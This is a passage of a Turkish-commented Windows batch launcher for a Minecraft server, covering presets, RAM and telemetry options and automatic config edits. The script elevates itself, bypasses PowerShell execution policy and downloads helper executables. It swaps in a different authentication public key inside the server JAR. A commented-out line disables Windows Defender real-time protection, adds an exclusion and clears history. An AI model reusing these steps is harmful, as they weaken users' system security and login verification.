

:: LifeMCServer baslatma kodu - flags.lifemcserver.com
:: Tanitim konusu icin flags.lifemcserver.com 'a gidebilirsiniz.

:: Her ne kadar hicbirsey yapmadan direk ilk calistirmanizda calismasi gereksede,

:: En iyi sonuclar icin .NET 5.0, Windows Server 2012 R2+/Windows 7+
:: ve PowerShell 7.x kullanin. .NET 5.0: https://dotnet.microsoft.com/download/dotnet/5.0

:: PowerShell 7.x
:: Windows 7 kullaniyorsaniz once WMF 4.0 kurun.

:: https://github.com/PowerShell/PowerShell/releases/latest/
:: Dosyalar kismindan PowerShell-7.x.x-win-x64/x86.msi olan kisma basip indirip kurun.

:: Java olarak 64-bit Oracle JDK onerilir. Fakat OpenJDK ve OpenJ9 da da calisir.
:: 1.16.4 gibi yeni surumler kullaniyorsaniz Java 15 tavsiye edilir.

:: Discord: https://discord.gg/tmupwqn - Tanitim Konusu: https://flags.lifemcserver.com


@echo off

:: Turkce karakter sorunu yasiyorsaniz alttaki satirin basindaki :: i kaldirin.
:: Not: Bu konsol fontunu kotu gozuken bir font ile degistirebilir.

:: chcp 65001 > nul

:: Bu kismi ellemeniz onerilmez

cd /d "%~dp0"

set "SystemPath=%SystemRoot%\System32"
if not "%ProgramFiles(x86)%"=="" set "SystemPath=%SystemRoot%\Sysnative"

if exist "%SystemPath%\cmd.exe" if exist "%0" if not "%1" == "true" start "" /b /c /d /belownormal /elevate "%SystemPath%\cmd.exe" "%0" true

if not defined in_subprocess (cmd /k set in_subprocess=y ^& %0 %*) & exit )

setlocal enableextensions enabledelayedexpansion

:: SURUM - degistermeniz onerilmez

set version=2.3.1

:: AYARLAR - kendinize gore duzenleyebilirsiniz

:: Hazir ayarlari belirler. Hazir ayarlar, sizin icin bir cok ayari otomatik olarak ayarlayabilir.
:: Uyari: Hazir ayarlar, ayarlar kisminda ki ayarlarin uzerine yazar. Ayarlariniz gecerliligini yitirebilir.

:: Olabilecek degerler: none, strict-jdk, strict-jdk-9, yatopia, dev, upgrade, no-tracking
:: Birden fazla degeri bosluk ile belirleyebilirsiniz. Ornek: settings_preset=strict-jdk no-tracking

:: none : Hic bir hazir ayar yuklemez ve tamamen asagida gireceginiz degerleri kullanir.

:: strict-jdk : Sadece Oracle'nin sitesinden (java.com degil) 64-bit JDK indirdiyseniz kullanin
:: strict-jdk-9 : Sadece Java 9 veya daha ust bir surum kullaniyorsaniz kullanin

:: online-mode : Sadece Premium hesaplarin giris yapabilmesi icin ayarlar

:: yatopia : Sadece Yatopia kullanmak istiyorsaniz kullanin
:: yatopia-leaflight : Sadece Yatopia leaflight kullanmak istiyorsaniz kullanin

:: dev : Gelistirici modu ayarlari. Normal kullanicilarin acmasi onerilmez.

:: upgrade : Buyuk surum guncellemelerinde acarsaniz surum yukseltmesi yapar. (orn. 1.12 -> 1.13, 1.13 -> 1.14)

:: no-tracking : Tum telemetri servislerini engeller. Performansa etkisi olabilir.
:: security : Guvenlik icin bazi ayarlar yapar. Performans dusurebilir veya bazi seyleri bozabilir fakat guvenligi arttirir.
set settings_preset=none

:: Sunucunuzun ana JAR dosyasinin adi - spigot, craftbukkit, paper, yatopia vb. olabilir
set jar_name=craftbukkit

:: Sunucunuzun surumu - 1.8.8, 1.9.4, 1.10.2, 1.11.2, 1.12.2, 1.13.2, 1.14.4, 1.15.2 veya 1.16.4 olabilir
:: Not: Sadece yukarida belirtilen sunucu JAR dosyasi yok ise calisir
set game_version=1.8.8

:: Eger sunucunuzu daha eski bir surumden 1.13 veya daha ust bir surume guncelleyecekseniz
:: bunu bir kez acip sonra yukseltme islemi bittiginde tekrar kapatmaniz onerilir.
set is_upgrading=false

:: Eger sunucunuzu 1.13'den 1.14'e veya 1.14'den daha ust bir surume yukseltiyorsaniz,
:: yukaridaki ayara ek olarak bunuda acip, yukseltme isleminden sonra kapatin.
set erase_cache=false

:: Sunucunun kullanacagi minimum ram miktari (MB icin M, GB icin G kullanin)
:: Eger 1536M (varsayilan) ise ve sistemde 1.5 GB ram yok ise, toplam RAM - 1GB'a otomatik dusurulebilir.
set min_ram=1536M

:: Sunucunun kullanacagi maximum ram miktari (MB icin M, GB icin G kullanin)
:: Eger 1536M (varsayilan) ise, toplam RAM - 1GB'a mumkun oldugunda otomatik genisletilebilir.
set max_ram=1536M

:: Kod onbellegi boyutu, 256M onerilir (MB icin M, GB icin G kullanin)
set code_cache=256M

:: Sunucunuzun daha az RAM yemesini fakat daha az performansli calismasini saglar
set less_ram=false

:: Eger konsolun renkli olmasini istemiyor iseniz false yapabilirsiniz
:: Konsol renkleri calismiyorsa jansi_passthrough ve jansi_force ayarlarini inceleyebilirsiniz
set colored_console=true

:: Sunucu kapandiktan sonra loglar temizlensin mi?
set clear_logs=true

:: JVM cokmelerini vs. depolayan dump dosyalarini siler. Bu dosyalar buyuk olabilir
:: ve disk alaninizdan yiyebilir. True kalmasi onerilir.
set clear_jvm_dumps=true

:: Sunucu kapandiktan sonra gereksiz dosyalar silinsin mi?
set auto_del_temp_files=true

:: Sunucu kapandiginda otomatik tekrar acar, cokme vb. durumlarda ise yarayabilir
set auto_restart=true

:: Sunucu kapandiktan ne kadar sonra yeniden baslatilsin? (saniye)
set delay=3

:: Eger herhangi bir kullanici arayuzu gerektiren plugin vs. kullaniyor iseniz false yapin
set head_less=true

:: Eger sunucunuzda cok timeout/disconnected sorunu yasiyorsaniz arttirabilirsiniz
:: Not: Ek olarak AsyncKeepAlive eklentisi isinize yarayabilir. Bu degeri 120'den yukari yapmaniz onerilmez.
set io_timeout=60

:: Eger sunucunuza sadece premium sahibi kisilerin girmesini istiyorsaniz true yapin
set online_mode=false

:: Eger dunya ayarlarini baslangicta konsola yazdirmasini istiyorsaniz true yapin
set verbose=false

:: Eger bStats'a telemetri verisi gonderilmesini istemiyorsaniz false yapin
:: Async oldugundan performansi fazla etkilemeyecektir fakat yine de performans kazanci saglayabilir.
set bstats_enabled=true

:: Snooperi kapatmak icin true yapin. Mojang'a telemetri verisi gonderen hizmete Snooper denir.
:: Kapatmanizin bir zarari yoktur. Kapatilmasi durumunda performans artabilir.
set disable_snooper=false

:: Query'i kapatmak icin true yapin. True oldugunda eklentileriniz webden goruntulenemez
:: (dinnerbone server status viewer ile) - true yapmaniz ayrica performansi da arttirabilir.
set disable_query=false

:: Help indexini gizlemek/kapatmak icin true yapin. /help ve /?'de sunucu komutlari gozukmez.
set disable_help_index=false

:: GELISMIS AYARLAR - duzenlemeniz pek onerilmez

:: Eger sunucu JAR dosyasi yok ise, otomatik olarak bu linkten indirilir
:: 1.15.2+ kullaniyorsaniz Paper'a gore daha performansli olan Yatopia'yi kullanmak icin "yatopia" girin.

:: Yatopia Leaflight surumunu kullanmak icin yatopia-leaflight girebilirsiniz.
set download_provider=paper

:: Eger Java 9 veya ustu bir surum kullaniyor iseniz ve hatalar aliyor iseniz true yapin
set allow_module_access=false

:: Eger baslatma scriptinin ayarlari ve bazi bilgileri yazdirmasini istiyor iseniz true yapin
set verbose_info=false

:: Eger sunucu dosyalariniz cok buyuk ise disk aktivitesini azaltmak icin kapatabilirsiniz
set unblock_files=true

:: Sunucunuzun daha optimizeli calismasi icin normal Java yerine JDK indirip bunu acabilirsiniz
set use_server_vm=false

:: Assertion ozelligini acar. Sadece gelistirici iseniz acin, sunucudaki hatalari arttirabilir
set enable_assertions=false

:: Hata ciktiginda mesaj kutusu gosterir, sunucuyu debug islemleri icin acik tutar
set messagebox_on_error=false

:: Eger sadece guvenli TLS surumlerini kullanmak ve TLS 1.3 aktif etmek istiyorsaniz true yapin
set use_secure_tls=false

:: Eger baslangicta Java surumunun yazdirilmasini istemiyorsaniz false yapin
set print_java_version=true

:: Java komutu - javaw.exe konumunu girin veya varsayilan JAVA_HOME'u kullanmak icin "java" yazin

:: Not: Klasor/java.exe yolunda / yerine \ kullanin ve "" icerisine yazin orn. "C:\Program Files\Java\jdk-15.0.1\bin\java.exe"
:: veya Java 8 icin "C:\Program Files\Java\jre1.8.0_271\bin\java.exe"
set java_command=java

:: HTTP baglantilari icin kullanilacak baglanti zaman asimi (yavas internet icin 30000, hizli internet icin 5000 yapin)
set connect_timeout=10000

:: HTTP baglantilari icin kullanilacak okuma zaman asimi (yavas internet icin 30000, hizli internet icin 5000 yapin)
set read_timeout=10000

:: Sunucunun sayisal IP adresini Timings sonuclarinda vs gorunmesi icin baslatma argumanlarina ekler
set expose_ip=false

:: MC 1.8 gibi eski surumlerde bulunabilen loglarda ANSI kodlari (orn. [m[0;32;1m) gozukmesi sorununu cozen Log4J config
:: dosyasini otomatik indirip kullanmasini kapatmak icin false yapabilirsiniz. Baslangici hizlandirabilir fakat onerilmez.
set use_custom_log4j_config=true

:: PERFORMANS AYARLARI - duzenlemeniz ancak performans sorunu yasiyorsaniz onerilir
:: Not: Sunucuzda lag var ve sunucunuz eski bir surum kullaniyorsa view-distance ve tab-complete ayarlariyla oynayin:

:: 1. server.properties & spigot.yml: view-distance ayarini 3 veya 4 yapin. (ne kadar dusuk yaparsaniz o kadar az lag olur)
:: 2. spigot.yml: tab-complete: 0 kismini tab-complete: -1 yapin.

:: Bunun disinda spawnin yuklenmesini geciktirecek olsa da paper.yml'den keep-spawn-loaded: true kismini da false yapabilirsiniz.
:: Son olarak TacoSpigot veya yuksek surum Paper kullaniyorsaniz taco/paper.yml de hopper kisminda disable-move-event'i true yapabilirsiniz.

:: Not: Java surumunuzunde guncel olduguna ve resmi sitelerden indirdiginize emin olun.

:: Bu ayari acarsaniz Aikar'in GC ayarlarindan bazilarini uygular. Performansa etkisi belirsizdir.
:: Arttiradabilir, azaltadabilir. Timings'de GC ile alakali sorunlariniz var ise deneyebilirsiniz.
set use_aikars_gc_settings=false

:: Eger renkli konsol calismiyorsa bunlari acmayi deneyebilirsiniz. Eger zaten calisiyor ise
:: acmayin; bozabilir.
set jansi_passthrough=false
set jansi_force=false

:: Eger bilgisayariniz ve Java surumunuz 64-bit ise bunu true yapin
set sixty_four_bit_java=false

:: Sunucunuzun performansini arttiran bir ayar, fakat bazi Java surumlerinde calismaz
set tiered_compilation=true

:: Surekli tekrarlanan hatalarda, hatanin bir kismini gizler. Gelistiriciler soyler ise kapatin
set omit_stacktrace=true

:: Class dosyalarini onbellege alarak performans arttirir, fakat bazi sistemlerde calismaz
set class_caching=false

:: Baslatma kodu uzun suruyorsa veya powershell ile alakali hata veriyorsa true yapin
set disable_powershell=false

:: MESAJLAR - kendinize gore duzenleyebilirsiniz

:: Eger birden fazla sunucu penceresi aciyorsaniz karistirmamak icin bir onek girebilirsiniz
:: orn. Skyblock, Bungee, Lobi vb.
set title_prefix=

:: Onek ile asil baslik arasina bosluk koyar
if not "%title_prefix%" equ "" set title_prefix=%title_prefix% 

:: Pencere basligi
set title=%title_prefix%Sunucu Konsolu

:: DIGER MESAJLAR
set baslatiliyor=Sunucu baslatilmak uzere, lutfen bekleyin...
set oto_ayarlar_uygulaniyor=Otomatik ayarlar uygulaniyor, bu biraz uzun surebilir, lutfen bekleyin...

set log4j_ayar_dosyasi_indiriliyor=Log4J ayar dosyasi indiriliyor...
set dosya_bloklari_kaldiriliyor=Dosya bloklari arka planda kaldiriliyor...

set ip_ayarlaniyor=IP ayarlaniyor...

set sunucu_baslatiliyor=Sunucu baslatiliyor...
set dosya_indiriliyor=Sunucu dosyasi indiriliyor...

set temizlik_yapiliyor=Temizlik yapiliyor...
set yeniden_baslatiliyor=Sunucu %delay% saniye icinde yeniden baslatilacak...

:: KOS KISMI - duzenlemeniz onerilmez

::

:: strict-jdk, strict-jdk-9, online-mode, yatopia, yatopia-leaflight, dev, upgrade, no-tracking

if not "x%settings_preset:strict-jdk=%" == "x%settings_preset%" (
 set use_server_vm=true
 set sixty_four_bit_java=true
 echo Strict JDK hazir ayarlari uygulandi.
)

if not "x%settings_preset:strict-jdk-9=%" == "x%settings_preset%" (
 ::set allow_module_access=true
 echo Strict JDK 9+ hazir ayarlari uygulandi.
)

if not "x%settings_preset:online-mode=%" == "x%settings_preset%" (
 set online_mode=true
 echo Premium sunucu hazir ayarlari uygulandi.
)

if not "x%settings_preset:yatopia=%" == "x%settings_preset%" (
 set download_provider=yatopia
 echo Yatopia hazir ayarlari uygulandi.
)

if not "x%settings_preset:yatopia-leaflight=%" == "x%settings_preset%" (
 set download_provider=yatopia-leaflight
 echo Yatopia Leaflight hazir ayarlari uygulandi.
)

if not "x%settings_preset:dev=%" == "x%settings_preset%" (
 set clear_logs=false
 set clear_jvm_dumps=false
 set auto_del_temp_files=false
 set io_timeout=120
 set verbose_info=true
 set enable_assertions=true
 set messagebox_on_error=true
 set omit_stacktrace=false
 ::set additional_commands=-XX:+UnlockDiagnosticVMOptions -XX:+PrintFlagsFinal -XX:+PrintFlagsWithComments 
 echo Gelistirici hazir ayarlari uygulandi.
)

if not "x%settings_preset:upgrade=%" == "x%settings_preset%" (
 set is_upgrading=true
 set erase_cache=true
 echo Guncelleme hazir ayarlari uygulandi.
)

if not "x%settings_preset:no-tracking=%" == "x%settings_preset%" (
 set bstats_enabled=false
 set disable_snooper=true
 set disable_query=true
 set disable_help_index=true
 echo Izleme engelleme hazir ayarlari uygulandi.
)

if not "x%settings_preset:security=%" == "x%settings_preset%" (
 set use_secure_tls=true
 echo Guvenlik hazir ayarlari uygulandi.
)

::

title %title%

set unblocked=false

set downloaded_log4j_config=false
set ip_address=127.0.0.1

:start
set start=%time%

echo.
echo %baslatiliyor%
echo.

if not "%~x0" equ ".cmd" echo.
if not "%~x0" equ ".cmd" echo Dosya uzantisi olarak .cmd onerilmektedir. (su anda kullanilan: %~x0)
if not "%~x0" equ ".cmd" echo.

if %verbose_info% equ true if "%1" == "true" echo Running from 64-bit command-line

set additional_parameters=
if %colored_console% equ false set additional_parameters= -nojline

if %verbose_info% equ true echo Checking server JAR...

if not exist "%jar_name%.jar" if exist "bukkit.jar" set jar_name=bukkit
if not exist "%jar_name%.jar" if exist "spigot.jar" set jar_name=spigot

if not exist "%jar_name%.jar" if exist "paper.jar" set jar_name=paper
if not exist "%jar_name%.jar" if exist "paperclip.jar" set jar_name=paperclip

if not exist "%jar_name%.jar" if exist "yatopia.jar" set jar_name=yatopia

set size=1
for /f "usebackq" %%a in ('%jar_name%.jar') do set "size=%%~za"

:: Result of an aborted download
if size lss 1 del /f /q "%jar_name%.jar" > nul 2> nul

if %verbose_info% equ true echo Processing download providers...

if not "x%download_provider:yatopia=%" == "x%download_provider%" (
 set download_url=https://api.yatopiamc.org/v2/latestBuild/download?branch=ver/%game_version%
)

if not "x%download_provider:yatopia-leaflight=%" == "x%download_provider%" (
 set download_url=https://api.yatopiamc.org/v2/latestBuild/download?branch=leaflight/ver/%game_version%
)

:: Try to automatically install PowerShell 7.1
::if %disable_powershell% equ false start "" /belownormal /wait /b msiexec.exe /package PowerShell-7.1.0-win-x64.msi /quiet ADD_EXPLORER_CONTEXT_MENU_OPENPOWERSHELL=1 ENABLE_PSREMOTING=1 REGISTER_MANIFEST=1

if %disable_powershell% equ false set powershell_command=powershell

:: Use PowerShell 7 if available
:: Currently causes script to wait longer before start-up. See https://github.com/PowerShell/PowerShell/issues/6443

::if %disable_powershell% equ false if exist "%ProgramFiles%\PowerShell\7\pwsh.exe" set "powershell_command=pwsh"

if %powershell_command% equ "pwsh" echo Using PowerShell 7

set powershell_arguments=-nologo -noprofile -noninteractive -executionpolicy bypass -mta -command

:: Enables TLS 1.3 but currently buggy and gives errors
:: $CurrentVersionTls = [System.Net.ServicePointManager]::SecurityProtocol; $AvailableTls = [enum]::GetValues('System.Net.SecurityProtocolType') ^| Where-Object { $_ -ge 'Tls12' }; $AvailableTls.ForEach({[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor $_});
set powershell_workarounds=$ProgressPreference = 'SilentlyContinue'; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; [System.Net.ServicePointManager]::DefaultConnectionLimit = [System.Int32]::MaxValue; [System.Net.WebRequest]::DefaultWebProxy = $null; [System.Net.ServicePointManager]::Expect100Continue = $false;

set powershell_new_web_client_wc=$WC = New-Object System.Net.WebClient; $WC.Proxy = $null; $WC.Encoding = New-Object System.Text.UTF8Encoding $false; $WC.Headers.Add('User-Agent', 'Mozilla/5.0'); $WC.Headers.Add('Accept', '*/*');

:: PowerShell kodlamasini UTF8 yapar, fakat suan bakimda
::if %disable_powershell% equ false %powershell_command% %powershell_arguments% "$OutputEncoding = [console]::InputEncoding = [console]::OutputEncoding = New-Object System.Text.UTF8Encoding"

:: Supposed to be a slow startup work-around but not working currently
::if %disable_powershell% equ false %powershell_command% %powershell_arguments% "Start-Process %powershell_command% '%powershell_arguments% [environment]::SetEnvironmentVariable(`POWERSHELL_UPDATECHECK_OPTOUT`, `1`); [environment]::SetEnvironmentVariable(`POWERSHELL_TELEMETRY_OPTOUT`, `1`); Set-MpPreference -DisableRealtimeMonitoring $True -Force; Enter-PSSession -HostName localhost -SSHTransport -UserName administrator' -Verb RunAs; . (Join-Path ([Runtime.InteropServices.RuntimeEnvironment]::GetRuntimeDirectory()) ngen.exe) update; Clear-History; [Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory(); Add-MpPreference -ExclusionPath '%powershell_command%'"

if %verbose_info% equ true (
 :: Shows the PowerShell version that is being used (either Windows default or PowerShell 7) and the underlying .NET version behind it.
 %powershell_command% %powershell_arguments% "%powershell_workarounds% $PSVersionTable.PSVersion; $PSVersionTable.CLRVersion"
)

if exist "%jar_name%.jar" (
 set disable_powershell_oldvalue=%disable_powershell%
 set disable_powershell=true
)

set response=none

if not "x%download_provider:paper=%" == "x%download_provider%" (
 if %disable_powershell% equ false if %verbose_info% equ true echo Getting response from Paper API v2...
 if %disable_powershell% equ false for /f "usebackq delims=" %%i in (`%powershell_command% %powershell_arguments% "%powershell_workarounds% %powershell_new_web_client_wc% $WC.DownloadString('https://papermc.io/api/v2/projects/paper/versions/%game_version%/')"`) do set "response=%%i"
)

if exist "%jar_name%.jar" (
 set disable_powershell=%disable_powershell_oldvalue%
)

if not "%response%" == "none" (
 if %verbose_info% equ true echo Processing paper API response...
 if %verbose_info% equ true echo Original response: %response%

 set "response=%response:,=" & set "response=%"

 set response=!response:]=!
 set response=!response:}=!

 set response=!response:[=!
 set response=!response::=!

 set response=!response:"=!

 set response=!response:b=!
 set response=!response:u=!
 set response=!response:i=!
 set response=!response:l=!
 set response=!response:d=!
 set response=!response:s=!

 set latest_build=!response!
 if %verbose_info% equ true echo Using build !latest_build!

 set download_url=https://papermc.io/api/v2/projects/paper/versions/%game_version%/builds/!latest_build!/downloads/paper-%game_version%-!latest_build!.jar
)

set batch_provided_jar=false

if not exist %jar_name%.jar (
 echo %dosya_indiriliyor%
 echo.
 if %verbose_info% equ true echo Using download provider url of %download_url%
 if %disable_powershell% equ false %powershell_command% %powershell_arguments% "%powershell_workarounds% %powershell_new_web_client_wc% $WC.DownloadFile('%download_url%', '%jar_name%.jar')" > nul

 set batch_provided_jar=true
)

::

set "scriptdir=%~dp0"
if not "%scriptdir:~-1%" == "\" set "scriptdir=%scriptdir%\"

if not exist "%scriptdir%cache" mkdir "%scriptdir%cache"

for /f %%k in ('dir /b "%scriptdir%cache\patched*.jar" 2^> nul') do set "patched_jar_name=%scriptdir%cache\%%k"

if exist "%scriptdir%cache\patched_%game_version%.jar" set "patched_jar_name=%scriptdir%cache\patched_%game_version%.jar"
if exist "%scriptdir%cache\patched.jar" set "patched_jar_name=%scriptdir%cache\patched.jar"

if "%patched_jar_name%" equ "" set patched_jar_name=%scriptdir%cache\first-start-non-existent.jar
if %verbose_info% equ true echo Using patched JAR file %patched_jar_name%

set cond=false

if "%patched_jar_name%" equ "%scriptdir%cache\patched.jar" set cond=true
if %batch_provided_jar% equ true set cond=true

if %use_custom_log4j_config% equ false set cond=false
if %use_custom_log4j_config% equ false del /f /q "%scriptdir%cache\log4j2.xml"

if %cond% equ true (
 set cond=false
 if %disable_powershell% equ false if %downloaded_log4j_config% equ false if %game_version% equ 1.8.8 set cond=true
)

if %cond% equ true echo %log4j_ayar_dosyasi_indiriliyor%
if %cond% equ true echo.

:: n: hotspot

set log4j2_config_download_url=https://raw.githubusercontent.com/LifeMC/site-assets/main/other/log4j2.xml

:: downloads in background if file already exists, speeds up repeated starts
if %cond% equ true if exist "%scriptdir%cache\log4j2.xml" start "" /b /belownormal %powershell_command% %powershell_arguments% "%powershell_workarounds% %powershell_new_web_client_wc% $WC.DownloadFile('%log4j2_config_download_url%', '%scriptdir%cache\log4j2.xml')" > nul
if %cond% equ true if not exist "%scriptdir%cache\log4j2.xml" %powershell_command% %powershell_arguments% "%powershell_workarounds% %powershell_new_web_client_wc% $WC.DownloadFile('%log4j2_config_download_url%', '%scriptdir%cache\log4j2.xml')" > nul

set downloaded_log4j_config=true

:: Above 1.8.8, Paper uses TerminalConsoleAppender, which has different Log4J2 configuration and fixes the issues
:: covered by the batch file provided log4j2 configuration file.
if exist "%scriptdir%cache\log4j2.xml" if %game_version% equ 1.8.8 if %cond% equ true set "log4j_config_parameter=-Dlog4j.configurationFile="%scriptdir%cache\log4j2.xml" "

echo %oto_ayarlar_uygulaniyor%

if exist "%patched_jar_name%" (
  if not exist "%scriptdir%cache\yggdrasil_session_pubkey_new.der" if %disable_powershell% equ false if %verbose_info% equ true echo Downloading yggdrasil certificate...
  if not exist "%scriptdir%cache\yggdrasil_session_pubkey_new.der" if %disable_powershell% equ false %powershell_command% %powershell_arguments% "%powershell_workarounds% %powershell_new_web_client_wc% $WC.DownloadFile('https://github.com/LifeMC/site-assets/raw/main/other/yggdrasil_session_pubkey.der', '%scriptdir%cache\yggdrasil_session_pubkey_new.der')" > nul

  if not exist "%scriptdir%cache\7z.exe" if %disable_powershell% equ false if %verbose_info% equ true echo Downloading 7z exe...
  if not exist "%scriptdir%cache\7z.exe" if %disable_powershell% equ false %powershell_command% %powershell_arguments% "%powershell_workarounds% %powershell_new_web_client_wc% $WC.DownloadFile('https://github.com/LifeMC/site-assets/raw/main/other/7z.exe', '%scriptdir%cache\7z.exe')" > nul

  if not exist "%scriptdir%cache\7z.dll" if %disable_powershell% equ false if %verbose_info% equ true echo Downloading 7z dll...
  if not exist "%scriptdir%cache\7z.dll" if %disable_powershell% equ false %powershell_command% %powershell_arguments% "%powershell_workarounds% %powershell_new_web_client_wc% $WC.DownloadFile('https://github.com/LifeMC/site-assets/raw/main/other/7z.dll', '%scriptdir%cache\7z.dll')" > nul

  if %verbose_info% equ true echo Patching the JAR file...

  "%scriptdir%cache\7z.exe" x "%patched_jar_name%" -o"%scriptdir%cache" yggdrasil_session_pubkey.der -r -y > nul

  fc "%scriptdir%cache\yggdrasil_session_pubkey.der" "%scriptdir%cache\yggdrasil_session_pubkey_new.der" > nul

  if errorlevel 1 del /f /q "%scriptdir%cache\yggdrasil_session_pubkey.der" > nul 2> nul
  if errorlevel 1 ren "%scriptdir%cache\yggdrasil_session_pubkey_new.der" yggdrasil_session_pubkey.der

  if errorlevel 1 "%scriptdir%cache\7z.exe" a -y "%patched_jar_name%" "%scriptdir%cache\yggdrasil_session_pubkey.der" > nul
  if errorlevel 1 move /y "%patched_jar_name%" "%scriptdir%%jar_name%.jar"
)

if %verbose_info% equ true echo Applying settings to config files...

if not exist "%scriptdir%eula.txt" if %verbose_info% equ true echo Creating eula...

if not exist "%scriptdir%eula.txt" echo eula=true> eula.txt

set spigot_config=spigot.yml

if not exist "%scriptdir%cache\fart.exe" if %disable_powershell% equ false if %verbose_info% equ true echo Downloading fart exe...
if not exist "%scriptdir%cache\fart.exe" if %disable_powershell% equ false %powershell_command% %powershell_arguments% "%powershell_workarounds% %powershell_new_web_client_wc% $WC.DownloadFile('https://github.com/LifeMC/site-assets/raw/main/other/fart.exe', '%scriptdir%cache\fart.exe')" > nul

if exist "%spigot_config%" if %verbose_info% equ true echo Setting up spigot config...

if exist "%spigot_config%" if %verbose% equ false "%scriptdir%cache\fart.exe" -q -i -C "%spigot_config%" "verbose: true" "verbose: false" > nul 2> nul
if exist "%spigot_config%" if %verbose% equ true "%scriptdir%cache\fart.exe" -q -i -C "%spigot_config%" "verbose: false" "verbose: true" > nul 2> nul

if 4 gtr %NUMBER_OF_PROCESSORS% if exist %spigot_config% "%scriptdir%cache\fart.exe" -q -i -C "%spigot_config%" "netty-threads: 4" "netty-threads: %NUMBER_OF_PROCESSORS%" > nul 2> nul

set paper_config=paper.yml

if exist "%paper_config%" if %verbose_info% equ true echo Setting up paper config...

if exist "%paper_config%" if %verbose% equ false "%scriptdir%cache\fart.exe" -q -i -C "%paper_config%" "verbose: true" "verbose: false" > nul 2> nul
if exist "%paper_config%" if %verbose% equ true "%scriptdir%cache\fart.exe" -q -i -C "%paper_config%" "verbose: false" "verbose: true" > nul 2> nul

if exist "%paper_config%" if %online_mode% equ true "%scriptdir%cache\fart.exe" -q -i -C "%paper_config%" "online-mode: false" "online-mode: true" > nul 2> nul
if exist "%paper_config%" if %online_mode% equ false "%scriptdir%cache\fart.exe" -q -i -C "%paper_config%" "online-mode: true" "online-mode: false" > nul 2> nul

if exist "%paper_config%" if %online_mode% equ true "%scriptdir%cache\fart.exe" -q -i -C "%paper_config%" "bungee-online-mode: false" "bungee-online-mode: true" > nul 2> nul
if exist "%paper_config%" if %online_mode% equ false "%scriptdir%cache\fart.exe" -q -i -C "%paper_config%" "bungee-online-mode: true" "bungee-online-mode: false" > nul 2> nul

:: For performance - if we can't load a chunk, don't try to load other chunks further away by
:: preventing player from moving into unloaded chunks.
if exist "%paper_config%" "%scriptdir%cache\fart.exe" -q -i -C "%paper_config%" "prevent-moving-into-unloaded-chunks: false" "prevent-moving-into-unloaded-chunks: true" > nul 2> nul

:: Optimizes explosion performance by caching entity lookups.
if exist "%paper_config%" "%scriptdir%cache\fart.exe" -q -i -C "%paper_config%" "optimize-explosions: false" "optimize-explosions: true" > nul 2> nul

:: Fixes CommandSender#hasPermission on ConsoleCommandSender
if exist "%paper_config%" "%scriptdir%cache\fart.exe" -q -i -C "%paper_config%" "console-has-all-permissions: false" "console-has-all-permissions: true" > nul 2> nul

:: Fixes Paper excessive velocity warnings.

if exist "%paper_config%" "%scriptdir%cache\fart.exe" -q -i -C "%paper_config%" "warnWhenSettingExcessiveVelocity: true" "warnWhenSettingExcessiveVelocity: false" > nul 2> nul

set server_config=server.properties

if exist "%server_config%" if %verbose_info% equ true echo Setting up server.properties...

if exist "%server_config%" if %online_mode% equ true "%scriptdir%cache\fart.exe" -q -i -C "%server_config%" "online-mode=false" "online-mode=true" > nul 2> nul
if exist "%server_config%" if %online_mode% equ false "%scriptdir%cache\fart.exe" -q -i -C "%server_config%" "online-mode=true" "online-mode=false" > nul 2> nul

if exist "%server_config%" if %disable_snooper% equ true "%scriptdir%cache\fart.exe" -q -i -C "%server_config%" "snooper-enabled=true" "snooper-enabled=false" > nul 2> nul
if exist "%server_config%" if %disable_snooper% equ false "%scriptdir%cache\fart.exe" -q -i -C "%server_config%" "snooper-enabled=false" "snooper-enabled=true" > nul 2> nul

:: Improves performance of chunk writes by making them async

if exist "%server_config%" "%scriptdir%cache\fart.exe" -q -i -C "%server_config%" "sync-chunk-writes: true" "sync-chunk-writes: false" > nul 2> nul

set "pluginmetrics_config=%scriptdir%plugins\PluginMetrics\config.yml"

if exist "%pluginmetrics_config%" if %verbose_info% equ true echo Setting up PluginMetrics config...

if exist "%pluginmetrics_config%" if %bstats_enabled% equ false "%scriptdir%cache\fart.exe" -q -i -C "%pluginmetrics_config%" "opt-out=false" "opt-out=true" > nul 2> nul
if exist "%pluginmetrics_config%" if %bstats_enabled% equ true "%scriptdir%cache\fart.exe" -q -i -C "%pluginmetrics_config%" "opt-out=true" "opt-out=false" > nul 2> nul

set "bstats_config=%scriptdir%plugins\bStats\config.yml"

if exist "%bstats_config%" if %verbose_info% equ true echo Setting up bStats config...

if exist "%bstats_config%" if %bstats_enabled% equ false "%scriptdir%cache\fart.exe" -q -i -C "%bstats_config%" "enabled: true" "enabled: false" > nul 2> nul
if exist "%bstats_config%" if %bstats_enabled% equ true "%scriptdir%cache\fart.exe" -q -i -C "%bstats_config%" "enabled: false" "enabled: true" > nul 2> nul

set bukkit_config=bukkit.yml

if exist "%bukkit_config%" if %verbose_info% equ true echo Setting up bukkit config...

if exist "%bukkit_config%" if %disable_query% equ true "%scriptdir%cache\fart.exe" -q -i -C "%bukkit_config%" "query-plugins: true" "query-plugins: false" > nul 2> nul
if exist "%bukkit_config%" if %disable_query% equ false "%scriptdir%cache\fart.exe" -q -i -C "%bukkit_config%" "query-plugins: false" "query-plugins: true" > nul 2> nul

:: Enable & Optimize Chunk GC
if exist "%bukkit_config%" if %disable_query% equ false "%scriptdir%cache\fart.exe" -q -i -C "%bukkit_config%" "load-threshold: 0" "load-threshold: 300" > nul 2> nul
if exist "%bukkit_config%" if %disable_query% equ false "%scriptdir%cache\fart.exe" -q -i -C "%bukkit_config%" "period-in-ticks: 600" "period-in-ticks: 300" > nul 2> nul

set purpur_config=purpur.yml

if exist "%purpur_config%" "%scriptdir%cache\fart.exe" -q -i -C "%purpur_config%" "dont-send-useless-entity-packets: false" "dont-send-useless-entity-packets: true" > nul 2> nul
if exist "%purpur_config%" "%scriptdir%cache\fart.exe" -q -i -C "%purpur_config%" "use-alternate-keepalive: false" "use-alternate-keepalive: true" > nul 2> nul

set yatopia_config=yatopia.yml

if exist "%yatopia_config%" "%scriptdir%cache\fart.exe" -q -i -C "%yatopia_config%" "fixFallDistance: false" "fixFallDistance: true" > nul 2> nul

set help_command_config=help.yml

if exist "%help_command_config%" if %verbose_info% equ true echo Setting up help.yml...

